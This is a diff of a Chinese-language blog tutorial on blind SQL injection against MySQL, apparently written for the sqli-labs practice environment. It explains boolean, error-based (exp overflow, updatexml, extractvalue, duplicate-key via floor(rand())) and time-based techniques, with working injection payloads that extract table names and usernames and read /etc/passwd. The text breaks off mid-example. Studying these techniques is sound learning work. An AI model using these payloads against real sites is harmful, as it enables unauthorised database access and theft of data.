@@ -3,13 +3,13 @@
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=''><title>SQL注入：盲注</title>
 
-<link rel='canonical' href='https://example.com/posts/sqli_blind_injection/'>
+<link rel='canonical' href='https://ginkgo.org.cn/posts/sqli_blind_injection/'>
 
 <link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SQL注入：盲注'>
 <meta property='og:description' content=''>
-<meta property='og:url' content='https://example.com/posts/sqli_blind_injection/'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/sqli_blind_injection/'>
 <meta property='og:site_name' content='Under The Ginkgo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='SQLi' /><meta property='article:published_time' content='2022-03-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-27T15:48:21&#43;01:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='SQLi' /><meta property='article:published_time' content='2022-03-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-31T22:00:35&#43;01:00'/>
 <meta name="twitter:title" content="SQL注入：盲注">
 <meta name="twitter:description" content="">
     <link rel="shortcut icon" href="/img/favicon.ico" />
@@ -250,7 +250,7 @@
 
 
                 <time class="article-time--reading">
-                    6 minute read
+                    9 minute read
                 </time>
             </div>
         
@@ -264,58 +264,68 @@
     <section class="article-content">
     
     
-    <h2 id="blind-injection">Blind injection</h2>
-<p>盲注的特点就在于页面不会显示返回任何有意义的信息，但是我们通过一些标识来得知注入语句是否被执行</p>
-<h3 id="布尔盲注">布尔盲注</h3>
-<p>通过构造一些布尔逻辑判断，查看页面是否发生变化来判断语句是否成功执行</p>
-<h4 id="left"><code>left()</code></h4>
-<p>left(database(),1)</p>
-<p>?id=1&rsquo;and left(version(),1)=5%23 #version 1st char</p>
-<p>?id=1&rsquo;and length(database())=8%23 # length match</p>
-<p>?id=1&rsquo; and left(database(), 1)&gt;&lsquo;a&rsquo; # database first char match</p>
-<p>?id=1&rsquo; and left(database(), 2)&gt;&lsquo;se&rsquo; # database first two chars match</p>
-<h4 id="substr-ascii"><code>substr()</code> <code>ascii()</code></h4>
-<p>ascii(subst((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1)) = 101</p>
-<p>#table_name 1st char match</p>
-<p>Get database() = &ldquo;security&rdquo;</p>
-<p>?id=1&rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1),1,1)) &gt; 80</p>
-<p>?id=1&rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1),2,1)) &gt; 80</p>
-<p>?id=1&rsquo;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1, 1),1,1)) &gt; 80</p>
-<h4 id="regexp"><code>regexp</code></h4>
-<p>?id=1&rsquo; and 1=(select 1 from information_schema.columns where table_name=&lsquo;users&rsquo; and table_name regexp &lsquo;^[a-z]&rsquo; limit 0,1)&ndash; -</p>
-<p>?id=1&rsquo; and 1=(select 1 from information_schema.columns where table_name=&lsquo;users&rsquo; and column_name regexp &lsquo;^username&rsquo; limit 0,1)&ndash; -</p>
-<h4 id="like-匹配注入"><code>like</code> 匹配注入</h4>
-<p>select user() like &lsquo;ro%&rsquo;
-The percent sign (%) represents zero, one, or multiple characters
-The underscore sign (_) represents one, single character</p>
-<h4 id="ord-and-mid"><code>ORD()</code> and <code>MID()</code></h4>
-<p>?id=1&rsquo;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68</p>
-<h3 id="报错盲注">报错盲注</h3>
-<p>将有价值的信息通过报错的方式显示输出
-前提：页面有错误信息显示出来
-<a class="link" href="https://www.freebuf.com/articles/web/274019.html"  target="_blank" rel="noopener"
+    <h2 id="sql-injection-blind-injection">SQL Injection: Blind injection</h2>
+<p>对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示的返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返回查询的内容，但是我们可以通过一些标志或者说信号（signal）来得知注入语句是否被执行</p>
+<h3 id="1-dot-布尔盲注">1. 布尔盲注</h3>
+<p>我们先来介绍布尔盲注，布尔Bool，意味着我们在将注入一些布尔逻辑判断，来查看页面是否发生变化来判断语句是否成功执行，比如：如果成功，则页面正常显示，否则就什么都不显示</p>
+<p>接下来我们来看一些由不同的函数组成的布尔判断</p>
+<h4 id="left">- <code>left()</code></h4>
+<p>通过left来截取字符，然后使用字母表进行逐个比较，如果等式成立，那么页面正常显示，如果失败，那么页面就无法正常显示，以此我们就可以推断字符串的内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and left(database(), 1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39; # database first char match
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;se&#39;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="k">first</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">chars</span><span class="w"> </span><span class="k">match</span><span class="w">
+</span></span></span></code></pre></div><p>可以先通过length来判断长度，方便进行</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and length(database())=8%23 # length match
+</span></span></span></code></pre></div><h4 id="substr-ascii">- <code>substr()</code> <code>ascii()</code></h4>
+<p>同样是截取字符，使用substr方法，然后通过ascii转换成ascii码后进行比较</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">tables_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">101</span><span class="w">
+</span></span></span></code></pre></div><h4 id="ord-and-mid">- <code>ORD()</code> and <code>MID()</code></h4>
+<p>与substr()和ascii()的组合类似，也是通过MID逐个选取字符，然后使用ORD返回ASCII进行比较</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68 # match username&#39;</span><span class="n">s</span><span class="w"> </span><span class="k">first</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">IFNULL</span><span class="w">
+</span></span></span></code></pre></div><h4 id="regexp">- <code>regexp</code></h4>
+<p>这次是利用正则表达式来进行比较</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and table_name regexp &#39;^[a-z]&#39; limit 0,1)-- -
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1)-- -
+</span></span></code></pre></div><h4 id="like-匹配注入">- <code>like</code> 匹配注入</h4>
+<p>通过模糊匹配来进行比较</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;ro%&#39;</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>The percent sign (%) represents zero, one, or multiple characters</li>
+<li>The underscore sign (_) represents one, single character</li>
+</ul>
+<h3 id="2-dot-报错盲注">2. 报错盲注</h3>
+<p>报错注入是将有价值的信息通过报错的方式显示输出。
+这里需要与普通的注入区分一下：</p>
+<ul>
+<li>普通的注入是将查询到的信息返回出来</li>
+<li>报错注入是构造特定的MYSQL函数语法错误，同时将所需要的信息拼接到错误返回信息中，然后再返回到页面上来</li>
+</ul>
+<p><a class="link" href="https://www.freebuf.com/articles/web/274019.html"  target="_blank" rel="noopener"
     >https://www.freebuf.com/articles/web/274019.html</a></p>
-<h4 id="bigint数据类型溢出报错注入">BigInt数据类型溢出报错注入</h4>
-<p>exp(int)函数， <code>mysql版本(5.5.5 - 5.5.49)</code>  = e^[int]
-目的是要造成&quot;DOUBLE value is out of range&quot;的错误</p>
+<h4 id="bigint数据类型溢出报错注入">- BigInt数据类型溢出报错注入</h4>
+<p>利用exp(int)函数，计算e^[int]的值，得到一个很大的数，目的是要造成&quot;DOUBLE value is out of range&quot;的错误
+只适用于， mysql版本5.5.5以上的版本</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and exp(~(select * from (select user())a))-- -
 </span></span></code></pre></div><p>1.先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a
 2.然后在查询select * from a 查询a，将结果集a全部查询出来
-3.查询完成，语句成功执行，返回值为0，将0按位取反（&rsquo;~&rsquo;）获取，使exp调用的时候报错</p>
+3.查询完成，语句成功执行，返回值为0，将0按位取反（&rsquo;~&rsquo;）就会得到一个无符号的最大BIGINT值，从而使exp调用的时候报错</p>
 <p>获取表名信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))-- -
 </span></span></code></pre></div><p>获取列名信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)a))
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)a))-- -
 </span></span></code></pre></div><p>获取列名对应的信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from(select username from &#39;usres&#39; limit 0,1)))
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from(select username from users limit 0,1)a))-- -
 </span></span></code></pre></div><p>读取文件</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select load_file(&#39;/etc/passwd&#39;))a))
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and exp(~(select * from (select load_file(&#39;/etc/passwd&#39;))a))-- -
 </span></span></code></pre></div><p>注意：对于所有的insert、update和delete语句DIOS查询也同样可以使用 除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入</p>
-<h4 id="参数格式错误">参数格式错误</h4>
+<h4 id="参数格式错误">- 参数格式错误</h4>
+<p>参数格式错误旨在使用特殊的函数，这些函数需要参数满足一定的条件，否则将会报出错误的信息，我们通过将需要的内容查询之后拼接到报出的错误信息中来实现报错注入</p>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p><code>updatexml()</code></p>
+<p>(1) <code>updatexml()</code></p>
 <p><code>updatexml()</code> 函数利用的就是mysql函数参数格式错误进行报错注入</p>
 <p><code>updatexml()</code> 函数语法：updatexml(XML_document,Xpath_string,new_value);</p>
 <p>函数语法解析：</p>
@@ -325,8 +335,8 @@ The underscore sign (_) represents one, single character</p>
 <p>适用版本是： <code>Mysql 5.1.5+</code></p>
 <p>利用方式：在执行两个函数时，如果出现xml文件路径错误，就会产生报错 那么我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错</p>
 <p>查询当前数据库的用户信息以及数据库版本信息</p>
-<p>?id=1&rsquo; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)&ndash; -
-根据上面对于Xpath_string的定义我们可以得知，当使用类似0x7e=&rsquo;~&lsquo;之类的额外字符的时候，会被认定为非Xpath，就会产生报错</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -
+</span></span></span></code></pre></div><p>根据上面对于Xpath_string的定义我们可以得知，当使用类似0x7e=&rsquo;~&lsquo;之类的额外字符的时候，会被认定为非Xpath，就会产生报错</p>
 <figure><img src="/ox-hugo/2022-03-23_20-38-37_screenshot.png" width="400px"/>
 </figure>
 
@@ -343,52 +353,219 @@ The underscore sign (_) represents one, single character</p>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p><code>extractvalue()</code></p>
+<p>(2) <code>extractvalue()</code></p>
 <p>函数语法:extractvalue(XML_document,XPath_string)</p>
 <p>适用的版本：5.1.5+</p>
 <p>利用的原理也是xpath格式不符报错注入</p>
 <p>获取当前是数据库名称及使用mysql数据库的版本信息：</p>
-<p>and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))</p>
-<p>获取当前注入点的用户权限信息及操作系统版本信息：</p>
-<p>and extractvalue(1,concat(0x7e,@@version_compile_os,0x7e,user(),0x7e))</p>
-<p>获取当前位置所用数据库的位置：</p>
-<p>and extractvalue(1,concat(0x7e,@@datadir,0x7e))</p>
-<p>获取数据表信息:</p>
-<p>and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))</p>
-<p>获取users数据表的列名信息:</p>
-<p>and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&lsquo;users&rsquo; limit 0,1),0x7e))</p>
-<p>获取对应的列名的信息(username\password):</p>
-<p>and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></div><p>获取当前注入点的用户权限信息及操作系统版本信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="n">version_compile_os</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></div><p>获取当前位置所用数据库的位置：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="n">datadir</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></div><p>获取数据表信息:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></div><p>获取users数据表的列名信息:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></div><p>获取对应的列名的信息(username\password):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></div></li>
+</ul>
+<h4 id="主键重复">- 主键重复</h4>
+<p><a class="link" href="https://www.freebuf.com/articles/web/242986.html"  target="_blank" rel="noopener"
+    >https://www.freebuf.com/articles/web/242986.html</a>
+主键重复无论是理解和解释都比较复杂，我们先给出常用的payload，然后慢慢细说</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>我们使用sali-labs的环境，因此这里的database()的值就是security
+以上payload的报错就是：</p>
+<figure><img src="/ox-hugo/2022-03-31_21-08-10_screenshot.png" width="600px"/>
+</figure>
+
+<p>我们观察到这里提示有&rsquo;security0&rsquo;主键重复,这里思考几个问题，1）security后面的0是哪里来的？2）主键是哪里来的？3）为什么会发生主键重复？4）为什么rand的seed是14（一般看到的可能就是0）</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>(1) security后面的0是哪里来的？</p>
+<p>通过 <code>floor(rand(14)*2)</code> 构造出来的</p>
+<p>rand([seed]),通过给定不同的seed来返回(0,1)的值，而floor()函数则会将float的值向下取整，那么rand(14)*2∈(0,2)，向下取整就变成了{0,1}</p>
 </li>
 </ul>
-<h4 id="主键重复">主键重复</h4>
-<p><a class="link" href="https://blog.csdn.net/m0%5F53065491/article/details/121893986"  target="_blank" rel="noopener"
-    >https://blog.csdn.net/m0%5F53065491/article/details/121893986</a>
-这种方式可以实现报错的原因是：虚拟表的主键重复。</p>
-<p>首先，主键重复方式的报错注入利用的函数有： <code>floor()</code> +  <code>rand()</code>  + <code>group()</code> + <code>count()</code></p>
-<p>其中， <code>floor()</code> 函数的作用就是返回小于等于该值的最大整数，即向下取整，只保留整数部分
-因此 <code>floor(rand(0)*2))就表示包含0，1的数组</code></p>
-<p><code>count(*)</code> 函数是一个聚合函数 group by 语句与 <code>count()</code> 函数结合，根据一个或多个列对结果集进行分组</p>
-<p>主键重复报错注入原理：
-使用group by 会首先生成一个虚拟表，虚拟表有两个字短，key, count(*),key表示主键，这里就是 <code>concat(database(),floor(rand(0)*2)</code> 的值，首先查看 <code>concat(database(),floor(rand(0)*2)</code> 的值是否存在，这里将会进行第一次计算</p>
-<p>我们当然知道数据库中没有 <code>[security0, security2]</code> 这样的字段，这种情况下，会直接将 <code>concat(database(),floor(rand(0)*2)</code> 的值直接当作主键插入临时表中，同时count(*) + 1,这里就进行了第二次计算。</p>
-<p>那么继续第二条记录，如果第一次 <code>concat(database(),floor(rand(0)*2)</code> 的计算发现没有主键（比如已经插入了security1,但这次计算出来发现security0不存在），那么要进行插入，第二次计算 <code>concat(database(),floor(rand(0)*2)</code> ，但是计算的结果又变回了 security1，插入失败，主键重复，导致报错
-payload：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
-</span></span><span class="line"><span class="cl">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
-</span></span></code></pre></div><h3 id="时间盲注">时间盲注</h3>
-<h4 id="sleep"><code>sleep()</code></h4>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>(2) 主键是哪里来的？</p>
+<p>我们这里使用了group by语句，目的是对查询的结果根据给出的字段进行分类，这里我们使用聚合函数count(*)，可以用来统计每个主键出现的次数</p>
+<p>在实际实现的过程中，数据库会首先创建一个空的临时表，包含两个字段
+key = concat(database(),floor(rand(14)*2))
+count(*) = 主键出现的次数</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>(3) 为什么会发生主键重复？</p>
+<p>我们接着看，接下来数据库会根据主键逐条查询users表中的内容。</p>
+<figure><img src="/ox-hugo/2022-03-31_21-23-38_screenshot.png" width="200px"/>
+</figure>
+
+<p>这里为了得到主键的具体内容，进行了第一次计算，得到security1(之前不是说了随机，这里我为什么说就是security1呢，因为实际测试结果就是，第一个生成的数字一定就是1，我认为可能和伪随机机制有关系)
+我们当然之后users表里不会有security1这样的字段，同样数据库也找不到，同时也没有发现重复的主键，因此会把主键的值直接插入临时表中，并将count(*)增加为1</p>
+<p>此时为了得到需要插入的主键的值，会再进行一次计算，得到的结果为security0（必然发生，理由同上）</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>security0</td>
+<td>1</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
+<p>继续检索第二条数据，计算主键的值，为security1（必然发生，理由同上），同样在users表中也没有找到主键的字段，同时也没有发现临时表中有重复的主键。</p>
+<p>接着插入主键的值，再次计算，得到security0（必然发生，理由同上）,但是这个时候在插入的时候，就会发生主键冲突而产生报错，因为原本的临时表中已经有一个security0了，同时会把数据库的名字+0拼接在报错信息上</p>
+<p>那么同样的，如果我们选择查询其他的信息来取得这里的database()，那么在报错的时候，就能看到所查询的信息</p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>（4）为什么将rand的seed设为14？</p>
+<p>大家可能平时看到的都是设为0的，那么先给大家看一下两种seed带来不同的效果</p>
+<!-- raw HTML omitted -->
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>floor(rand(0)*2)</th>
+<th>usage</th>
+<th>query number</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>主键计算</td>
+<td>0</td>
+</tr>
+<tr>
+<td>1</td>
+<td>主键插入</td>
+<td>0</td>
+</tr>
+<tr>
+<td>1</td>
+<td>主键计算</td>
+<td>1</td>
+</tr>
+<tr>
+<td>0</td>
+<td>主键插入</td>
+<td>1</td>
+</tr>
+<tr>
+<td>1</td>
+<td>主键计算</td>
+<td>2</td>
+</tr>
+<tr>
+<td>1</td>
+<td>主键插入，主键重复，报错</td>
+<td>2</td>
+</tr>
+</tbody>
+</table></div>
+<p>这里需要至少三条记录才能造成主键重复</p>
+<p>那我们再来看seed为14的时候，伪随机给出的顺序为</p>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>floor(rand(0)*2)</th>
+<th>usage</th>
+<th>query number</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>主键计算</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0</td>
+<td>主键插入</td>
+<td>0</td>
+</tr>
+<tr>
+<td>1</td>
+<td>主键计算</td>
+<td>1</td>
+</tr>
+<tr>
+<td>0</td>
+<td>主键插入，主键重复，报错</td>
+<td>1</td>
+</tr>
+</tbody>
+</table></div>
+<p>很明显，只要有两条记录，即可造成报错</p>
+<p>大家可以根据我的sql语句进行尝试，得到的结果顺序应该是一致，这也就回答了为什么我之前提到的明明是随机到的结果，为什么说是必然的到的。</p>
+</li>
+</ul>
+<h3 id="3-dot-时间盲注">3. 时间盲注</h3>
+<h4 id="sleep">- <code>sleep()</code></h4>
 <p>利用一些延时函数来造成响应时间的变化来，判断语句是否成功执行</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">If</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">115</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="o">%</span><span class="mi">23</span><span class="w"> </span><span class="o">//</span><span class="k">if</span><span class="w"> </span><span class="err">判断语句，条件为假，</span><span class="w"> </span><span class="err">执行</span><span class="w"> </span><span class="n">sleep</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">sleep</span><span class="p">(</span><span class="n">find_in_set</span><span class="p">(</span><span class="n">mmid</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;0,1,2,3,4,5,6,7,8,9,.&#39;</span><span class="p">));</span><span class="w">
